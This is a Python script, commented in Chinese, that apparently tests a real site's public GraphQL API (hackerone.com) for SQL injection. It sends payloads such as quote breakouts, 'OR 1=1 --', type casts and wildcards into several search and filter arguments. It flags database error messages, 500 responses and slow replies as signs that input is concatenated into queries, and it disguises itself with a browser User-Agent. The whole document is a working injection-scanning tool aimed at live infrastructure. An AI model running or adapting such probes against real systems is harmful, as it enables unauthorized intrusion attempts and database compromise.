# -*- coding: utf-8 -*-
"""h1x49k2: PostgreSQL 特性注入矩阵——逐类型排除(匿名只读,零破坏)
点:leaderboard_entries(filter/engagement_type/user_type) cwe_entries(search)
   ranked_cve_entries(search) external_programs(search_input)
类型:引号闭合/注释/类型转换/转义串/LIKE通配/空白/函数盲注
判别:报错信息(PG syntax error/invalid input) = 拼接信号;优雅空结果 = 参数化"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

Q = chr(39)

def probe(name, qstr, timeout=18):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        dt = round(time.time() - t0, 1)
        body = r.text.replace('\n', ' ')[:220]
        flag = ''
        low = r.text.lower()
        if 'syntax error' in low or 'invalid input' in low or 'column' in low and 'does not exist' in low:
            flag = ' <<<SQL-SIG'
        elif r.status_code == 500:
            flag = ' <<<500'
        elif dt > 5:
            flag = f' <<<SLOW'
        print(f'--- {name} [{r.status_code} {dt}s]{flag} {body}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')
    time.sleep(0.9)

def jdump(v):
    return json.dumps(v, ensure_ascii=False)

# ============ 1. leaderboard_entries ============
# 基线:key 枚举需内省——先试 researcher(year 常规)
probe('LB_base_2025', '{ leaderboard_entries(key: researcher, year: 2025, first: 1) { total_count } }')
# filter String 注入
INJ = ['x', Q, 'x' + Q, Q + ' OR 1=1 --', 'x--', 'x' + Q + '--', "x' OR '1'='1", 'x\\', '%', '*',
       "1'::int--", 'x/**/', "x'||'y", 'E' + Q + chr(92) + 'x27', 'x\tOR\ty', 'x%0aOR%0a1=1']
for v in INJ:
    probe('LB_filter ' + repr(v)[:22], '{ leaderboard_entries(key: researcher, year: 2025, filter: %s, first: 1) { total_count } }' % jdump(v))
# engagement_type/user_type String
for v in ['x', Q, Q + ' OR 1=1 --', 'x--', "x'::int"]:
    probe('LB_etype ' + repr(v)[:16], '{ leaderboard_entries(key: researcher, year: 2025, engagement_type: %s, first: 1) { total_count } }' % jdump(v))
    probe('LB_utype ' + repr(v)[:16], '{ leaderboard_entries(key: researcher, year: 2025, user_type: %s, first: 1) { total_count } }' % jdump(v))

# ============ 2. cwe_entries(search) ============
probe('CWE_base', '{ cwe_entries(first: 1) { total_count } }')
probe('CWE_search_ok', '{ cwe_entries(search: "sql", first: 1) { total_count } }')
for v in [Q, Q + ' OR 1=1 --', 'x--', "x'::int", '%', '_', 'a_b', '[ab]', 'x\\', 'sql%', '%sql%']:
    probe('CWE_search ' + repr(v)[:18], '{ cwe_entries(search: %s, first: 1) { total_count } }' % jdump(v))

# ============ 3. ranked_cve_entries(search) ============
probe('RCE_search_ok', '{ ranked_cve_entries(search: "heartbleed", first: 1) { total_count } }')
for v in [Q, Q + ' OR 1=1 --', 'x--', "x'::int", '%', '_', 'x\\']:
    probe('RCE_search ' + repr(v)[:16], '{ ranked_cve_entries(search: %s, first: 1) { total_count } }' % jdump(v))

# ============ 4. external_programs(search_input) ============
probe('EP_search_ok', '{ external_programs(search_input: "uber", first: 1) { total_count } }')
for v in [Q, Q + ' OR 1=1 --', 'x--', "x'::int", '%', '_', 'x\\']:
    probe('EP_search ' + repr(v)[:16], '{ external_programs(search_input: %s, first: 1) { total_count } }' % jdump(v))
